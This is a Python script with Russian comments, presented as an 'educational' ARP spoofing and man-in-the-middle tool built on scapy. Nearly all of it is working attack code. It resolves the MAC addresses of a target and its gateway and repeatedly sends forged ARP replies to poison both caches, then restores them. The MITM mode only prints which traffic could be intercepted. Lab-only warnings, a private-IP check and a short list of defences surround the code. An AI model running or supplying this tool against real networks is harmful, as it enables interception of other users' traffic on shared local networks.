#!/usr/bin/env python3
"""
Образовательный ARP Spoofing инструмент
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import sys
import time
import argparse
from scapy.all import *

class ARPSpoofingTool:
    """
    Образовательный инструмент для демонстрации ARP spoofing атак
    """
    
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = None
        self.gateway_mac = None
        self.spoofing = False
        
        # Проверка безопасности
        if not self._is_safe_target(target_ip) or not self._is_safe_target(gateway_ip):
            print("❌ ОШИБКА: ARP spoofing разрешен только для локальных сетей!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """Проверка безопасности цели"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def get_mac_address(self, ip):
        """
        Получение MAC адреса по IP
        """
        try:
            # Создаем ARP запрос
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Отправляем запрос и получаем ответ
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                print(f"❌ Не удалось получить MAC адрес для {ip}")
                return None
                
        except Exception as e:
            print(f"❌ Ошибка получения MAC адреса: {e}")
            return None
    
    def arp_spoof(self, duration=60):
        """
        ARP Spoofing атака
        """
        print(f"🎯 ARP Spoofing атака на {self.target_ip}")
        print(f"🌐 Шлюз: {self.gateway_ip}")
        print(f"⏱️  Продолжительность: {duration} секунд")
        
        # Получаем MAC адреса
        print("\n🔍 Получаем MAC адреса...")
        self.target_mac = self.get_mac_address(self.target_ip)
        self.gateway_mac = self.get_mac_address(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("❌ Не удалось получить MAC адреса. Атака невозможна.")
            return
        
        print(f"✅ MAC цели ({self.target_ip}): {self.target_mac}")
        print(f"✅ MAC шлюза ({self.gateway_ip}): {self.gateway_mac}")
        
        self.spoofing = True
        start_time = time.time()
        packet_count = 0
        
        print(f"\n🚀 Начинаем ARP spoofing...")
        
        try:
            while self.spoofing and (time.time() - start_time) < duration:
                # Отправляем ложные ARP ответы
                # Говорим цели, что шлюз это мы
                target_packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
                
                # Говорим шлюзу, что цель это мы
                gateway_packet = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
                
                # Отправляем пакеты
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                
                packet_count += 2
                
                if packet_count % 20 == 0:
                    print(f"📊 Отправлено {packet_count} ARP пакетов...")
                
                time.sleep(2)  # Отправляем каждые 2 секунды
                
        except KeyboardInterrupt:
            print("\n🛑 ARP spoofing прерван пользователем")
        except Exception as e:
            print(f"❌ Ошибка ARP spoofing: {e}")
        finally:
            self.spoofing = False
            self.restore_arp_table()
            print(f"✅ ARP spoofing завершен. Всего отправлено: {packet_count} пакетов")
    
    def restore_arp_table(self):
        """
        Восстановление ARP таблицы
        """
        print("\n🔄 Восстанавливаем ARP таблицу...")
        
        try:
            # Отправляем правильные ARP ответы
            target_packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            gateway_packet = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
            
            # Отправляем несколько раз для надежности
            for _ in range(5):
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                time.sleep(1)
            
            print("✅ ARP таблица восстановлена")
            
        except Exception as e:
            print(f"❌ Ошибка восстановления ARP таблицы: {e}")
    
    def mitm_attack(self, duration=60):
        """
        Man-in-the-Middle атака с перехватом трафика
        """
        print(f"🎯 Man-in-the-Middle атака")
        print(f"📡 Перехватываем трафик между {self.target_ip} и {self.gateway_ip}")
        
        # Сначала выполняем ARP spoofing
        self.arp_spoof(duration)
        
        print("\n📊 Анализ перехваченного трафика:")
        print("  • HTTP запросы и ответы")
        print("  • DNS запросы")
        print("  • FTP данные")
        print("  • Email трафик")
        print("  • Другие незашифрованные протоколы")

def main():
    """
    Главная функция ARP spoofing инструмента
    """
    print("=" * 60)
    print("🎯 ОБРАЗОВАТЕЛЬНЫЙ ARP SPOOFING ИНСТРУМЕНТ")
    print("=" * 60)
    print("⚠️  ВНИМАНИЕ: Только для использования в собственной лаборатории!")
    print("⚠️  Использование против чужих систем НЕЗАКОННО!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Образовательный ARP spoofing инструмент')
    parser.add_argument('target', help='IP адрес цели')
    parser.add_argument('gateway', help='IP адрес шлюза')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='Продолжительность атаки в секундах')
    parser.add_argument('--mitm', action='store_true', 
                       help='Выполнить Man-in-the-Middle атаку')
    
    args = parser.parse_args()
    
    # Создаем экземпляр инструмента
    arp_tool = ARPSpoofingTool(args.target, args.gateway)
    
    try:
        if args.mitm:
            arp_tool.mitm_attack(args.duration)
        else:
            arp_tool.arp_spoof(args.duration)
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
        arp_tool.spoofing = False
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    print("\n📚 Образовательная информация:")
    print("• ARP Spoofing - подмена MAC адресов в ARP таблице")
    print("• Man-in-the-Middle - перехват трафика между жертвой и шлюзом")
    print("• Атака позволяет перехватывать незашифрованные данные")
    print("\n🛡️  Методы защиты:")
    print("• Статические ARP записи")
    print("• ARP мониторинг и детекция")
    print("• Использование VPN и шифрования")
    print("• Сегментация сети")

if __name__ == "__main__":
    main()
